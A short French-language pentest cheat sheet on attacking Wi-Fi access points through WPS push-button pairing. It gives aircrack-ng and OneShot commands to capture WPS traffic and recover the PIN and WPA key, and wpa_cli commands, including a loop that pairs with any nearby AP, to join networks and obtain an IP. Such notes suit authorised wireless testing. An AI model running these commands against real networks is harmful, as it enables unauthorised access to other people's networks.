
Consiste à appuyer sur le bouton WPS pour s'appairer avec l'AP.


Avec [[#OneShot]]
Avec [[#WPA_CLI]]

# OneShot

https://github.com/fulvius31/OneShot

> [!TIP]
> Permet de récupérer la PIN et donc la clé WPA par la suite

## 1. Passer en mode monitor

```shell-session
sudo airmon-ng start wlan0
```

```shell-session
iwconfig
```

## 2. Scan WPS networks

Capturer le trafic et afficher les information WPS

```shell-session
sudo airodump-ng --wps --ignore-negative-one wlan0mon
```

## 3. PBC Attack

avec OneShot

```shell-session
sudo python3 /opt/OneShot/oneshot.py -i wlan0mon --pbc
```


---

# WPA_CLI

> [!TIP]
> Appairage simple avec l'AP. Ne nécessite pas le mode monitor.


## 1. Scanner les réseaux

```shell-session
iwlist wlan0 scan |  grep 'Cell\|Quality\|ESSID\|IEEE'
```

## 2. Appairage avec l'AP

1. Après avoir appuyé sur le bouton PBC.

```shell-session
sudo wpa_cli wps_pbc <BSSID>
```

ou boucle while pour s'appairer avec n'importe quel AP.

```
while: ; do sudo wpa_cli wps_pbc any ; sleep 120 ; done
```

2. Vérifier la connexion à l'AP

```shell-session
sudo systemctl status wpa_supplicant
```

3. Demander une IP

```shell-session
sudo dhclient wlan0
```

```shell-session
ifconfig
```